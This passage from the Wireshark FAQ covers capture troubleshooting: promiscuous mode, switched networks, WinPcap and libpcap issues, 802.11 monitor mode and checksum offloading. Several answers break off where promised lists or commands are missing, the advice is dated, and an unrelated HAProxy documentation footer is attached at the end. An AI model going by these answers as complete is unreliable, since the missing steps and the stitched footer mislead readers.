Wireshark can only be linked with version 4.2.2 or later of UCD SNMP.
Your version of Wireshark was dynamically linked with such a version of
UCD SNMP; however, you have an older version of UCD SNMP installed,
which means that when Wireshark is run, it tries to link to the older
version, and fails.  You will have to replace that version of UCD SNMP
with version 4.2.2 or a later version.


Q 4.2: 
I've installed Wireshark from Fink on macOS; why is it very slow to
start up?


A:


When an application is installed on macOS, prior to 10.4, it is usually
"prebound" to speed up launching the application.  (That's what the
"Optimizing" phase of installation is.)



Fink normally performs prebinding automatically when you install a
package. However, in some rare cases, for whatever reason the prebinding
caches get corrupt, and then not only does prebinding fail, but startup
actually becomes much slower, because the system tries in vain to
perform prebinding "on the fly" as you launch the application. This
fails, causing sometimes huge delays.



To fix the prebinding caches, run the command


Q 5.1: 
I have an XXX network card on my machine; if I try to capture on it, why
does my machine crash or reset itself?


A:


This is almost certainly a problem with one or more of:

so:


Q 5.2: 
Why does my machine crash or reset itself when I select "Start" from the
"Capture" menu or select "Preferences" from the "Edit" menu?


A:


Both of those operations cause Wireshark to try to build a list of the
interfaces that it can open; it does so by getting a list of interfaces
and trying to open them.  There is probably an OS, driver, or, for
Windows, WinPcap bug that causes the system to crash when this happens;
see the previous question.



Q 6.1: When I use Wireshark to capture packets, why do I see only
packets to and from my machine, or not see all the traffic I'm expecting
to see from or to the machine I'm trying to monitor?

A:


This might be because the interface on which you're capturing is plugged
into an Ethernet or Token Ring switch; on a switched network, unicast
traffic between two ports will not necessarily appear on other ports -
only broadcast and multicast traffic will be sent to all ports.



Note that even if your machine is plugged into a hub, the "hub" may be
a switched hub, in which case you're still on a switched network.



Note also that on the Linksys Web site, they say that their
auto-sensing hubs "broadcast the 10Mb packets to the port that operate
at 10Mb only and broadcast the 100Mb packets to the ports that operate
at 100Mb only", which would indicate that if you sniff on a 10Mb port,
you will not see traffic coming sent to a 100Mb port, and vice
versa.  This problem has also been reported for Netgear dual-speed
hubs, and may exist for other "auto-sensing" or "dual-speed" hubs.



Some switches have the ability to replicate all traffic on all ports to
a single port so that you can plug your analyzer into that single port to
sniff all traffic.  You would have to check the documentation for the
switch to see if this is possible and, if so, to see how to do this.
See the switch
reference page on the Wireshark
Wiki for information on some switches.  (Note that it's a Wiki, so
you can update or fix that information, or add additional information on
those switches or information on new switches, yourself.)



Note also that many firewall/NAT boxes have a switch built into them;
this includes many of the "cable/DSL router" boxes.  If you have a box
of that sort, that has a switch with some number of Ethernet ports into
which you plug machines on your network, and another Ethernet port used
to connect to a cable or DSL modem, you can, at least, sniff traffic
between the machines on your network and the Internet by plugging
the Ethernet port on the router going to the modem, the Ethernet port on
the modem, and the machine on which you're running Wireshark into a hub
(make sure it's not a switching hub, and that, if it's a dual-speed hub,
all three of those ports are running at the same speed.



If your machine is not plugged into a switched network or a
dual-speed hub, or it is plugged into a switched network but the port is
set up to have all traffic replicated to it, the problem might be that
the network interface on which you're capturing doesn't support
"promiscuous" mode, or because your OS can't put the interface into
promiscuous mode.  Normally, network interfaces supply to the host only:

Most network interfaces can also be put in "promiscuous" mode, in which
they supply to the host all network packets they see.  Wireshark will try
to put the interface on which it's capturing into promiscuous mode
unless the "Capture packets in promiscuous mode" option is turned off in
the "Capture Options" dialog box, and TShark will try to put the
interface on which it's capturing into promiscuous mode unless the
-p option was specified.  However, some network interfaces
don't support promiscuous mode, and some OSes might not allow interfaces
to be put into promiscuous mode.



If the interface is not running in promiscuous mode, it won't see any
traffic that isn't intended to be seen by your machine.  It
will see broadcast packets, and multicast packets sent
to a multicast MAC address the interface is set up to receive.



You should ask the vendor of your network interface whether it supports
promiscuous mode.  If it does, you should ask whoever supplied the
driver for the interface (the vendor, or the supplier of the OS you're
running on your machine) whether it supports promiscuous mode with that
network interface.



In the case of token ring interfaces, the drivers for some of them, on
Windows, may require you to enable promiscuous mode in order to capture
in promiscuous mode.  See the Wireshark
Wiki item on Token Ring capturing for details.



In the case of wireless LAN interfaces, it appears that, when those
interfaces are promiscuously sniffing, they're running in a
significantly different mode from the mode that they run in when they're
just acting as network interfaces (to the extent that it would be a
significant effort for those drivers to support for promiscuously
sniffing and acting as regular network interfaces at the same
time), so it may be that Windows drivers for those interfaces don't
support promiscuous mode.


Q 6.2: When I capture with Wireshark, why can't I see any TCP
packets other than packets to and from my machine, even though another
analyzer on the network sees those packets?

A:


You're probably not seeing any packets other than unicast
packets to or from your machine, and broadcast and multicast packets; a
switch will normally send to a port only unicast traffic sent to the MAC
address for the interface on that port, and broadcast and multicast
traffic - it won't send to that port unicast traffic sent to a MAC
address for some other interface - and a network interface not in
promiscuous mode will receive only unicast traffic sent to the MAC
address for that interface, broadcast traffic, and multicast traffic
sent to a multicast MAC address the interface is set up to receive.



TCP doesn't use broadcast or multicast, so you will only see your own
TCP traffic, but UDP services may use broadcast or multicast so you'll
see some UDP traffic - however, this is not a problem with TCP traffic,
it's a problem with unicast traffic, as you also won't see all UDP
traffic between other machines.



I.e., this is probably the same question
as this earlier one; see the response to that question.


Q 6.3: Why am I only seeing ARP packets when I try to capture
traffic?

A:


You're probably on a switched network, and running Wireshark on a machine
that's not sending traffic to the switch and not being sent any traffic
from other machines on the switch.  ARP packets are often broadcast
packets, which are sent to all switch ports.



I.e., this is probably the same question
as this earlier one; see the response to that question.


Q 6.4: 
Why am I not seeing any traffic when I try to capture traffic?

A:


Is the machine running Wireshark sending out any traffic on the network
interface on which you're capturing, or receiving any traffic on that
network, or is there any broadcast traffic on the network or multicast
traffic to a multicast group to which the machine running Wireshark
belongs?



If not, this may just be a problem with promiscuous sniffing, either due
to running on a switched network or a dual-speed hub, or due to problems
with the interface not supporting promiscuous mode; see the response to
this earlier question.



Otherwise, on Windows, see the response to this
question and, on a UNIX-flavored OS, see the response to this question.


Q 6.5: 
Can Wireshark capture on (my T1/E1 line, SS7 links, etc.)?


A:


Wireshark can only capture on devices supported by libpcap/WinPcap.  On
most OSes, only devices that can act as network interfaces of the type
that support IP are supported as capture devices for libpcap/WinPcap,
although the device doesn't necessarily have to be running as an IP
interface in order to support traffic capture.



On Linux and FreeBSD, libpcap 0.8 and later support the API for Endace Measurement Systems'
DAG cards, so that a system with one of those cards, and its driver
and libraries, installed can capture traffic with those cards with
libpcap-based applications.  You would either have to have a version of
Wireshark built with that version of libpcap, or a dynamically-linked
version of Wireshark and a shared libpcap library with DAG support, in
order to do so with Wireshark.  You should ask Endace whether that could
be used to capture traffic on, for example, your T1/E1 link.



See the SS7 capture
setup page on the Wireshark
Wiki for current information on capturing SS7 traffic on TDM
links.


Q 6.6: How do I put an interface into promiscuous mode?

A:


By not disabling promiscuous mode when running Wireshark or TShark.



Note, however, that:

I.e., this is probably the same question
as this earlier one; see the response to that question.


Q 6.7: 
I can set a display filter just fine; why don't capture filters work?


A:


Capture filters currently use a different syntax than display filters.  Here's
the corresponding section from the
wireshark(1)
man page:



"Display filters in Wireshark are very powerful; more fields are filterable
in Wireshark than in other protocol analyzers, and the syntax you can
use to create your filters is richer. As Wireshark progresses, expect
more and more protocol fields to be allowed in display filters.



Packet capturing is performed with the pcap library. The capture filter
syntax follows the rules of the pcap library. This syntax is different
from the display filter syntax."



The capture filter syntax used by libpcap can be found in the
tcpdump(8)
man page.


Q 6.8: I'm entering valid capture filters; why do I still get
"parse error" errors?

A:


There is a bug in some versions of libpcap/WinPcap that cause it to
report parse errors even for valid expressions if a previous filter
expression was invalid and got a parse error.



Try exiting and restarting Wireshark; if you are using a version of
libpcap/WinPcap with this bug, this will "erase" its memory of the
previous parse error.  If the capture filter that got the "parse error"
now works, the earlier error with that filter was probably due to this
bug.



The bug was fixed in libpcap 0.6; 0.4[.x] and 0.5[.x] versions of
libpcap have this bug, but 0.6[.x] and later versions don't.



Versions of WinPcap prior to 2.3 are based on pre-0.6 versions of
libpcap, and have this bug; WinPcap 2.3 is based on libpcap 0.6.2, and
doesn't have this bug.



If you are running Wireshark on a UNIX-flavored platform, run "wireshark
-v", or select "About Wireshark..." from the "Help" menu in Wireshark, to
see what version of libpcap it's using.  If it's not 0.6 or later, you
will need either to upgrade your OS to get a later version of libpcap,
or will need to build and install a later version of libpcap from the tcpdump.org Web site and then
recompile Wireshark from source with that later version of libpcap.



If you are running Wireshark on Windows with a pre-2.3 version of
WinPcap, you will need to un-install WinPcap and then download and
install WinPcap 2.3.


Q 6.9: 
How can I capture packets with CRC errors?


A:


Wireshark can capture only the packets that the packet capture library -
libpcap on UNIX-flavored OSes, and the WinPcap port to Windows of libpcap
on Windows - can capture, and libpcap/WinPcap can capture only the
packets that the OS's raw packet capture mechanism (or the WinPcap
driver, and the underlying OS networking code and network interface
drivers, on Windows) will allow it to capture.



Unless the OS always supplies packets with errors such as invalid CRCs
to the raw packet capture mechanism, or can be configured to do so,
invalid CRCs to the raw packet capture mechanism, Wireshark - and other
programs that capture raw packets, such as tcpdump - cannot capture
those packets.  You will have to determine whether your OS needs to be
so configured and, if so, can be so configured, configure it if
necessary and possible, and make whatever changes to libpcap and the
packet capture program you're using are necessary, if any, to support
capturing those packets.



Most OSes probably do not support capturing packets
with invalid CRCs on Ethernet, and probably do not support it on most
other link-layer types.  Some drivers on some OSes do support it, such
as some Ethernet drivers on FreeBSD; in those OSes, you might always get
those packets, or you might only get them if you capture in promiscuous
mode (you'd have to determine which is the case).



Note that libpcap does not currently supply to programs that use it an
indication of whether the packet's CRC was invalid (because the drivers
themselves do not supply that information to the raw packet capture
mechanism); therefore, Wireshark will not indicate which packets had CRC
errors unless the FCS was captured (see the next question) and you're
using Wireshark 0.9.15 and later, in which case Wireshark will check the
CRC and indicate whether it's correct or not.


Q 6.10: 
How can I capture entire frames, including the FCS?


A:


Wireshark can only capture data that the packet capture library -
libpcap on UNIX-flavored OSes, and the WinPcap port to Windows of
libpcap on Windows - can capture, and libpcap/WinPcap can capture only
the data that the OS's raw packet capture mechanism (or the WinPcap
driver, and the underlying OS networking code and network interface
drivers, on Windows) will allow it to capture.



For any particular link-layer network type, unless the OS supplies the
FCS of a frame as part of the frame, or can be configured to do so,
Wireshark - and other programs that capture raw packets, such as tcpdump
- cannot capture the FCS of a frame.  You will have to determine whether
your OS needs to be so configured and, if so, can be so configured,
configure it if necessary and possible, and make whatever changes to
libpcap and the packet capture program you're using are necessary, if
any, to support capturing the FCS of a frame.



Most OSes do not support capturing the FCS of a frame
on Ethernet, and probably do not support it on most other link-layer
types.  Some drivres on some OSes do support it, such as some (all?)
Ethernet drivers on NetBSD and possibly the driver for Apple's gigabit
Ethernet interface in macOS; in those OSes, you might always get the
FCS, or you might only get the FCS if you capture in promiscuous mode
(you'd have to determine which is the case).



Versions of Wireshark prior to 0.9.15 will not treat an Ethernet FCS in a
captured packet as an FCS.  0.9.15 and later will attempt to determine
whether there's an FCS at the end of the frame and, if it thinks there
is, will display it as such, and will check whether it's the correct
CRC-32 value or not.


Q 6.11: 
I'm capturing packets on a machine on a VLAN; why don't the packets I'm
capturing have VLAN tags?


A:


You might be capturing on what might be called a "VLAN interface" - the
way a particular OS makes VLANs plug into the networking stack might,
for example, be to have a network device object for the physical
interface, which takes VLAN packets, strips off the VLAN header and
constructs an Ethernet header, and passes that packet to an internal
network device object for the VLAN, which then passes the packets onto
various higher-level protocol implementations.



In order to see the raw Ethernet packets, rather than "de-VLANized"
packets, you would have to capture not on the virtual interface for the
VLAN, but on the interface corresponding to the physical network device,
if possible.  See the Wireshark Wiki
item on VLAN capturing for details.


Q 6.12: 
Why does Wireshark hang after I stop a capture?


A:


The most likely reason for this is that Wireshark is trying to look up an
IP address in the capture to convert it to a name (so that, for example,
it can display the name in the source address or destination address
columns), and that lookup process is taking a very long time.



Wireshark calls a routine in the OS of the machine on which it's running
to convert of IP addresses to the corresponding names.  That routine
probably does one or more of:

If a DNS server that's used in an address lookup is not responding, the
lookup will fail, but will only fail after a timeout while the system
routine waits for a reply.



In addition, on Windows systems, if the DNS lookup of the address fails,
either because the server isn't responding or because there are no
records in the DNS that could be used to map the address to a name, a
NetBIOS-over-TCP query will be made.  That query involves sending a
message to the NetBIOS-over-TCP name service on that machine, asking for
the name and other information about the machine.  If the machine isn't
running software that responds to those queries - for example, many
non-Windows machines wouldn't be running that software - the lookup will
only fail after a timeout.  Those timeouts can cause the lookup to take
a long time.



If you disable network address-to-name translation - for example, by
turning off the "Enable network name resolution" option in the "Capture
Options" dialog box for starting a network capture - the lookups of the
address won't be done, which may speed up the process of reading the
capture file after the capture is stopped.  You can make that setting
the default by selecting "Preferences" from the "Edit" menu, turning off
the "Enable network name resolution" option in the "Name resolution"
options in the preferences disalog box, and using the "Save" button in
that dialog box; note that this will save all your current
preference settings.



If Wireshark hangs when reading a capture even with network name
resolution turned off, there might, for example, be a bug in one of
Wireshark's dissectors for a protocol causing it to loop infinitely.  If
you're not running the most recent release of Wireshark, you should first
upgrade to that release, as, if there's a bug of that sort, it might've
been fixed in a release after the one you're running.  If the hang
occurs in the most recent release of Wireshark, the bug should be
reported to the Wireshark
developers' mailing list at [email protected].



On UNIX-flavored OSes, please try to force Wireshark to dump core, by
sending it a SIGABRT signal (usually signal 6) with the
kill command, and then get a stack trace if you have a debugger
installed.  A stack trace can be obtained by using your debugger
(gdb in this example), the Wireshark binary, and the resulting
core file.  Here's an example of how to use the gdb command
backtrace to do so.

The core dump file may be named "wireshark.core" rather than "core" on
some platforms (e.g., BSD systems).



Also, if at all possible, please send a copy of the capture file that caused
the problem.  When capturing packets, Wireshark normally writes captured
packets to a temporary file, which will probably be in /tmp or
/var/tmp on UNIX-flavored OSes, \TEMP on the main system disk
(normally \Documents and Settings\your login name
\Local Settings\Temp on the main system disk on Windows
Windows XP and Server 2003, and
\Users\your login name\AppData\Local\Temp on the main
system disk on Windows Vista and later, so the capture file will probably be there.  If you
are capturing on a single interface, it will have a name of the form,
wireshark_<iface>_YYYYmmddHHMMSS_XXXXXX.<fmt>, where
<fmt> is the capture file format (pcap or pcapng), and <iface> is
the actual name of the interface you are capturing on; otherwise, if you are
capturing on multiple interfaces, it will have a name of the form,
wireshark_<N>_interfaces_YYYYmmddHHMMSS_XXXXXX.<fmt>, where <N>
is the number of simultaneous interfaces you are capturing on.  Please don't
send a trace file greater than 1 MB when compressed; instead, make it available
via FTP or HTTP, or say it's available but leave it up to a developer to ask
for it.  If the trace file contains sensitive information (e.g., passwords),
then please do not send it.



Q 7.1: 
I'm running Wireshark on Windows; why does some network interface on my
machine not show up in the list of interfaces in the "Interface:" field
in the dialog box popped up by "Capture->Start", and/or why does
Wireshark give me an error if I try to capture on that interface?


A:


If you are running Wireshark on Windows XP,
or Windows Server 2003, and this is the first time you have run a
WinPcap-based program (such as Wireshark, or TShark, or WinDump, or
Analyzer, or...) since the machine was rebooted, you need to run that
program from an account with administrator privileges; once you have run
such a program, you will not need administrator privileges to run any
such programs until you reboot.



If you are running on Windows Windows XP or Windows Server
2003 and have administrator privileges or a WinPcap-based program has
been run with those privileges since the machine rebooted, this problem
might clear up if you completely un-install WinPcap and then
re-install it.



If that doesn't work, then note that Wireshark relies on the WinPcap
library, on the WinPcap device driver, and on the facilities that come
with the OS on which it's running in order to do captures.



Therefore, if the OS, the WinPcap library, or the WinPcap driver don't
support capturing on a particular network interface device, Wireshark
won't be able to capture on that device.



WinPcap 2.3 has problems supporting PPP WAN interfaces on Windows NT
4.0, Windows 2000, Windows XP, and Windows Server 2003, and, to avoid
those problems, support for PPP WAN interfaces on those versions of
Windows has been disabled in WinPcap 3.0.  Regular dial-up lines, ISDN
lines, ADSL connections using PPPoE or PPPoA, and various other lines
such as T1/E1 lines are all PPP interfaces, so those interfaces might
not show up on the list of interfaces in the "Capture Options"
dialog on those OSes.



On Windows 2000, Windows XP, and Windows Server 2003, but
not Windows NT 4.0 or Windows Vista Beta 1, you should
be able to capture on the "GenericDialupAdapter" with WinPcap 3.1.  (3.1
beta releases called it the "NdisWanAdapter"; if you're using a 3.1 beta
release, you should un-install it and install the final 3.1 release.)
See the Wireshark
Wiki item on PPP capturing for details.



WinPcap prior to 3.0 does not support multiprocessor machines (note
that machines with a single multi-threaded processor, such as Intel's
new multi-threaded x86 processors, are multiprocessor machines as far as
the OS and WinPcap are concerned), and recent 2.x versions of WinPcap
refuse to operate if they detect that they're running on a
multiprocessor machine, which means that they may not show any network
interfaces.  You will need to use WinPcap 3.0 to capture on a
multiprocessor machine.



If an interface doesn't show up in the list of interfaces in the
"Interface:" field, and you know the name of the interface, try entering
that name in the "Interface:" field and capturing on that device.



If the attempt to capture on it succeeds, the interface is somehow not
being reported by the mechanism Wireshark uses to get a list of
interfaces.  Try listing the interfaces with WinDump; see the WinDump Web site
for information on using WinDump.



You would run WinDump with the -D flag; if it lists the
interface, please report this to [email protected]
giving full details of the problem, including

If WinDump does not list the interface,
this is almost certainly a problem with one or more of:

so first check the
WinPcap FAQ to see if your problem is mentioned there. If not, then see the WinPcap support page
- check the "Submitting bugs" section.



If you are having trouble capturing on a particular network interface,
first try capturing on that device with WinDump; see the WinDump Web site
for information on using WinDump.



If you can capture on the interface with WinDump, send mail to [email protected]
giving full details of the problem, including

If you cannot capture on the interface with WinDump,
this is almost certainly a problem with one or more of:

so first check the
WinPcap FAQ to see if your problem is mentioned there. If not, then see the WinPcap support page
- check the "Submitting bugs" section.



You may also want to ask the [email protected]
and the [email protected]
mailing lists to see if anybody happens to know about the problem and
know a workaround or fix for the problem.  (Note that you will have to
subscribe to that list in order to be allowed to mail to it; see the WinPcap support
page for information on the mailing list.) In your mail,
please give full details of the problem, as described above, and also
indicate that the problem occurs with WinDump, not just with Wireshark.


Q 7.2: 
I'm running Wireshark on Windows; why do no network interfaces show up in
the list of interfaces in the "Interface:" field in the dialog box
popped up by "Capture->Start"?


A:


This is really the same question as a previous
one; see the response to that question.


Q 7.3: 
I'm running Wireshark on Windows; why doesn't my serial port/ADSL
modem/ISDN modem show up in the list of interfaces in the "Interface:"
field in the dialog box popped up by "Capture->Start"?


A:


Internet access on those devices is often done with the Point-to-Point
(PPP) protocol; WinPcap 2.3 has problems supporting PPP WAN interfaces
on Windows NT 4.0, Windows 2000, Windows XP, and Windows Server 2003,
and, to avoid those problems, support for PPP WAN interfaces on those
versions of Windows has been disabled in WinPcap 3.0.



On Windows 2000, Windows XP, and Windows Server 2003, but
not Windows NT 4.0 or Windows Vista Beta 1, you should
be able to capture on the "GenericDialupAdapter" with WinPcap 3.1.  (3.1
beta releases called it the "NdisWanAdapter"; if you're using a 3.1 beta
release, you should un-install it and install the final 3.1 release.)
See the Wireshark
Wiki item on PPP capturing for details.



Q 7.4: 
I'm running Wireshark on Windows NT 4.0/Windows 2000/Windows XP/Windows
Server 2003; my machine has a PPP (dial-up POTS, ISDN, etc.) interface,
and it shows up in the "Interface" item in the "Capture Options" dialog
box.  Why can no packets be sent on or received from that network while
I'm trying to capture traffic on that interface?

A:


Some versions of WinPcap have problems with PPP WAN interfaces on
Windows NT 4.0, Windows 2000, Windows XP, and Windows Server 2003; one
symptom that may be seen is that attempts to capture in promiscuous mode
on the interface cause the interface to be incapable of sending or
receiving packets.  You can disable promiscuous mode using the
-p command-line flag or the item in the "Capture Preferences"
dialog box, but this may mean that outgoing packets, or incoming
packets, won't be seen in the capture.



On Windows 2000, Windows XP, and Windows Server 2003, but
not Windows NT 4.0 or Windows Vista Beta 1, you should
be able to capture on the "GenericDialupAdapter" with WinPcap 3.1.  (3.1
beta releases called it the "NdisWanAdapter"; if you're using a 3.1 beta
release, you should un-install it and install the final 3.1 release.)
See the Wireshark
Wiki item on PPP capturing for details.


Q 7.5: 
I'm running Wireshark on Windows; why am I not seeing any traffic being
sent by the machine running Wireshark?

A:


If you are running some form of VPN client software, it might be causing
this problem; people have seen this problem when they have Check Point's
VPN software installed on their machine.  If that's the cause of the
problem, you will have to remove the VPN software in order to have
Wireshark (or any other application using WinPcap) see outgoing packets;
unfortunately, neither we nor the WinPcap developers know any way to
make WinPcap and the VPN software work well together.



Also, some drivers for Windows (especially some wireless network
interface drivers) apparently do not, when running in promiscuous mode,
arrange that outgoing packets are delivered to the software that
requested that the interface run promiscuously; try turning promiscuous
mode off.


Q 7.6: 
When I capture on Windows in promiscuous mode, I can see packets other
than those sent to or from my machine; however, those packets show up
with a "Short Frame" indication, unlike packets to or from my machine.
What should I do to arrange that I see those packets in their entirety?


A:


In at least some cases, this appears to be the result of PGPnet running
on the network interface on which you're capturing; turn it off on that
interface.



Q 7.7: 
I'm trying to capture 802.11 traffic on Windows; why am I not seeing any
packets?


A:


At least some 802.11 card drivers on Windows appear not to see any
packets if they're running in promiscuous mode.  Try turning promiscuous
mode off; you'll only be able to see packets sent by and received by
your machine, not third-party traffic, and it'll look like Ethernet
traffic and won't include any management or control frames, but that's a
limitation of the card drivers.



See the archived MicroLogix's
list of cards supported with WinPcap for information on
support of various adapters and drivers with WinPcap.


Q 7.8: 
I'm trying to capture 802.11 traffic on Windows; why am I seeing packets
received by the machine on which I'm capturing traffic, but not packets
sent by that machine?


A:


This appears to be another problem with promiscuous mode; try turning it
off.


Q 7.9: 
I'm trying to capture Ethernet VLAN traffic on Windows, and I'm
capturing on a "raw" Ethernet device rather than a "VLAN interface", so
that I can see the VLAN headers; why am I seeing packets received by the
machine on which I'm capturing traffic, but not packets sent by that
machine?


A:


The way the Windows networking code works probably means that packets
are sent on a "VLAN interface" rather than the "raw" device, so packets
sent by the machine will only be seen when you capture on the "VLAN
interface".  If so, you will be unable to see outgoing packets when
capturing on the "raw" device, so you are stuck with a choice between
seeing VLAN headers and seeing outgoing packets.



Q 8.1: 
I'm running Wireshark on a UNIX-flavored OS; why does some network
interface on my machine not show up in the list of interfaces in the
"Interface:" field in the dialog box popped up by "Capture->Start",
and/or why does Wireshark give me an error if I try to capture on that
interface? 

A:


You may need to run Wireshark from an account with sufficient privileges
to capture packets, such as the super-user account, or may need to give
your account sufficient privileges to capture packets.  Only those
interfaces that Wireshark can open for capturing show up in that list; if
you don't have sufficient privileges to capture on any interfaces, no
interfaces will show up in the list.  See
the
Wireshark Wiki item on capture privileges for details on how to give
a particular account or account group capture privileges on platforms
where that can be done.



If you are running Wireshark from an account with sufficient privileges,
then note that Wireshark relies on the libpcap library, and on the
facilities that come with the OS on which it's running in order to do
captures.  On some OSes, those facilities aren't present by default; see
the
Wireshark Wiki item on adding capture support for details.



And, even if you're running with an account that has sufficient
privileges to capture, and capture support is present in your OS, if the
OS or the libpcap library don't support capturing on a particular
network interface device or particular types of devices, Wireshark won't
be able to capture on that device.



On Solaris, note that libpcap 0.6.2 and earlier didn't support Token
Ring interfaces; the current version, 0.7.2, does support Token Ring,
and the current version of Wireshark works with libpcap 0.7.2 and later.



If an interface doesn't show up in the list of interfaces in the
"Interface:" field, and you know the name of the interface, try entering
that name in the "Interface:" field and capturing on that device.



If the attempt to capture on it succeeds, the interface is somehow not
being reported by the mechanism Wireshark uses to get a list of
interfaces; please report this to [email protected]
giving full details of the problem, including

If you are having trouble capturing on a particular network interface,
and you've made sure that (on platforms that require it) you've arranged
that packet capture support is present, as per the above, first try
capturing on that device with tcpdump.



If you can capture on the interface with tcpdump, send mail to
[email protected]
giving full details of the problem, including

If you cannot capture on the interface with tcpdump,
this is almost certainly a problem with one or more of:

so you should report the problem to the company or organization that
produces the OS (in the case of a Linux distribution, report the problem
to whoever produces the distribution).



You may also want to ask the [email protected]g
and the [email protected]
mailing lists to see if anybody happens to know about the problem and
know a workaround or fix for the problem.  In your mail, please give
full details of the problem, as described above, and also indicate that
the problem occurs with tcpdump not just with Wireshark.


Q 8.2: 
I'm running Wireshark on a UNIX-flavored OS; why do no network interfaces
show up in the list of interfaces in the "Interface:" field in the
dialog box popped up by "Capture->Start"?


A:


This is really the same question as the previous
one; see the response to that question.


Q 8.3: I'm capturing packets on Linux; why do the time stamps have
only 100ms resolution, rather than 1us resolution?

A:


Wireshark gets time stamps from libpcap/WinPcap, and
libpcap/WinPcap get them from the OS kernel, so Wireshark - and any other
program using libpcap, such as tcpdump - is at the mercy of the time
stamping code in the OS for time stamps.



At least on x86-based machines, Linux can get high-resolution time
stamps on newer processors with the Time Stamp Counter (TSC) register;
for example, Intel x86 processors, starting with the Pentium Pro, and
including all x86 processors since then, have had a TSC, and other
vendors probably added the TSC at some point to their families of x86
processors.

The Linux kernel must be configured with the CONFIG_X86_TSC option
enabled in order to use the TSC.  Make sure this option is enabled in
your kernel.



In addition, some Linux distributions may have bugs in their versions of
the kernel that cause packets not to be given high-resolution time
stamps even if the TSC is enabled.  See, for example, bug 61111 for Red
Hat Linux 7.2.  If your distribution has a bug such as this, you may
have to run a standard kernel from kernel.org in order to get
high-resolution time stamps.



Q 9.1: 
How can I capture raw 802.11 frames, including non-data (management,
beacon) frames?


A:


That depends on the operating system on which you're running, and on the
802.11 interface on which you're capturing.



This would probably require that you capture in promiscuous mode or in
the mode called "monitor mode" or "RFMON mode".  On some platforms, or
with some cards, this might require that you capture in monitor mode -
promiscuous mode might not be sufficient.  If you want to capture
traffic on networks other than the one with which you're associated, you
will have to capture in monitor mode.



Not all operating systems support capturing non-data packets and, even
on operating systems that do support it, not all drivers, and thus not
all interfaces, support it.  Even on those that do, monitor mode might
not be supported by the operating system or by the drivers for all
interfaces.


NOTE: an interface running in monitor mode will, on
most if not all platforms, not be able to act as a regular network
interface; putting it into monitor mode will, in effect, take your
machine off of whatever network it's on as long as the interface is in
monitor mode, allowing it only to passively capture packets.



This means that you should disable name resolution when capturing in
monitor mode; otherwise, when Wireshark (or TShark, or tcpdump) tries
to display IP addresses as host names, it will probably block for a long
time trying to resolve the name because it will not be able to
communicate with any DNS or NIS servers.



See the Wireshark
Wiki item on 802.11 capturing for details.



Q 9.2: 
How do I capture on an 802.11 device in monitor mode?

A:


Whether you will be able to capture in monitor mode depends on the
operating system, adapter, and driver you're using.
See the previous question for information
on monitor mode, including a link to the Wireshark Wiki page that gives
details on 802.11 capturing.


Q 10.1: Why am I seeing lots of packets with incorrect TCP checksums?

A:


If the packets that have incorrect TCP checksums are all being sent by
the machine on which Wireshark is running, this is probably because the
network interface on which you're capturing does TCP checksum
offloading.  That means that the TCP checksum is added to the packet by
the network interface, not by the OS's TCP/IP stack; when capturing on
an interface, packets being sent by the host on which you're capturing
are directly handed to the capture interface by the OS, which means that
they are handed to the capture interface without a TCP checksum being
added to them.



The only way to prevent this from happening would be to disable TCP
checksum offloading, but

However, you can disable the check that Wireshark does of the TCP
checksum, so that it won't report any packets as having TCP checksum
errors, and so that it won't refuse to do TCP reassembly due to a packet
having an incorrect TCP checksum.  That can be set as an Wireshark
preference by selecting "Preferences" from the "Edit" menu, opening up
the "Protocols" list in the left-hand pane of the "Preferences" dialog
box, selecting "TCP", from that list, turning off the "Check the
validity of the TCP checksum when possible" option, clicking "Save" if
you want to save that setting in your preference file, and clicking
"OK".



It can also be set on the Wireshark or TShark command line with a
-o tcp.check_checksum:false command-line flag, or manually set
in your preferences file by adding a tcp.check_checksum:false
line.


Q 10.2: 
I've just installed Wireshark, and the traffic on my local LAN
is boring.  Where can I find more interesting captures?


A:


We have a collection of strange and exotic sample capture
files at https://wiki.wireshark.org/SampleCaptures

Q 10.3: 
Why doesn't Wireshark correctly identify RTP packets? It shows them
only as UDP.

A:


Wireshark can identify a UDP datagram as containing a packet of a
particular protocol running atop UDP only if

RTP doesn't have a standard port number, so 1) doesn't work; it doesn't,
as far as I know, have any "signature", so 2) doesn't work.



That leaves 3).  If there's RTSP traffic that sets up an RTP session,
then, at least in some cases, the RTSP dissector will set things up so
that subsequent RTP traffic will be identified.  Currently, that's the
only place we do that; there may be other places.



However, there will always be places where Wireshark is simply
incapable of deducing that a given UDP flow is RTP; a mechanism
would be needed to allow the user to specify that a given conversation
should be treated as RTP.  As of Wireshark 0.8.16, such a mechanism
exists; if you select a UDP or TCP packet, the right mouse button menu
will have a "Decode As..." menu item, which will pop up a dialog box
letting you specify that the source port, the destination port, or both
the source and destination ports of the packet should be dissected as
some particular protocol.


Q 10.4: 
Why doesn't Wireshark show Yahoo Messenger packets in captures that
contain Yahoo Messenger traffic?

A:


Wireshark only recognizes as Yahoo Messenger traffic packets to or from TCP
port 3050 that begin with "YPNS", "YHOO", or "YMSG".  TCP segments that
start with the middle of a Yahoo Messenger packet that takes more than one
TCP segment will not be recognized as Yahoo Messenger packets (even if the
TCP segment also contains the beginning of another Yahoo Messenger
packet).


Q 11.1: I saved a filter and tried to use its name to filter the
display; why do I get an "Unexpected end of filter string" error?

A:


You cannot use the name of a saved display filter as a filter.  To
filter the display, you can enter a display filter expression -
not the name of a saved display filter - in the
"Filter:" box at the bottom of the display, and type the <Enter> key or
press the "Apply" button (that does not require you to have a saved
filter), or, if you want to use a saved filter, you can press the
"Filter:" button, select the filter in the dialog box that pops up, and
press the "OK" button.

Q 11.2: 
How can I search for, or filter, packets that have a particular string
anywhere in them?


A:


If you want to do this when capturing, you can't.  That's a feature that
would be hard to implement in capture filters without changes to the
capture filter code, which, on many platforms, is in the OS kernel and,
on other platforms, is in the libpcap library.



After capture, you can search for text by selecting Edit→Find
Packet... and making sure String is selected. Alternately, you can
use the "contains" display filter operator or "matches" operator if it's
supported on your system.


Q 11.3: 
How do I filter a capture to see traffic for virus XXX?


A:


For some viruses/worms there might be a capture filter to recognize the
virus traffic.  Check the CaptureFilters page
on the Wireshark Wiki to see if
anybody's added such a filter.



Note that Wireshark was not designed to be an intrusion detection system;
you might be able to use it as an IDS, but in most cases software
designed to be an IDS, such as Snort
or Prelude, will probably work
better.


Riverbed is Wireshark's primary
    sponsor and provides our funding.
    They also make great products that fully integrate with Wireshark.


					Keyboard navigation : 

					You can use left and right arrow keys to navigate between chapters.

Converted with haproxy-dconv v0.3.1-62 on 2018/05/29
version 1.7.11

								willy tarreau
								2018/04/30
